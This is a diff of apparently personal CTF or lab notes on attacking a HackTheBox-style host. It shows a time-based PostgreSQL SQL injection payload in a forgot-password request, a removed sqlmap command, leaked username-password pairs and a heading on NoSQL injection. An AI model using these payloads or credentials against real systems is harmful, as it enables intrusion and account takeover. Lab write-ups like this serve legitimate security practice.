@@ -11,8 +11,6 @@ tables:
 | forgot  |
 | roles  
 
-john :42zyTJ94BwdKjEw1XNmt
-
 ### Request 
 ```POST /forgot HTTP/1.1
 Host: www.royalflush.htb
@@ -37,8 +35,13 @@ Connection: keep-alive
 email=asd%40me.c'||+(SELECT+pg_sleep(10)::text)||'&csrf_token=IjljNzVhY2ZjMTVjMWQ4MjYwMTU5NmNmMWNhYzQ3Mzg5NzdhMWQ0NmEi.anbewQ.zb1KnWGEDBsZOMxVhX87RuuN-fo
 ```
 
+![[Screenshot from 2026-08-08 19-00-27.png]]
+
+Result: Sleep 10 seconds
+
+
 SQLMAP command 
-`sqlmap -r sql.txt --level=5 --risk=3 -D public --tables --dbms=postgres --technique=T --proxy="http://127.0.0.1:8080" --force-ssl --tamper=nosemi.py
+
 `
 
 
@@ -46,6 +49,12 @@ SQLMAP command
 charles:charles
 
 ![[Screenshot from 2026-08-08 15-06-48.png]]
+
+### Passoword Leaked
+
+
+![[Screenshot from 2026-08-08 18-58-23.png]]
+john :42zyTJ94BwdKjEw1XNmt
 
 ### NOSQLI at verify-email endpoint
 
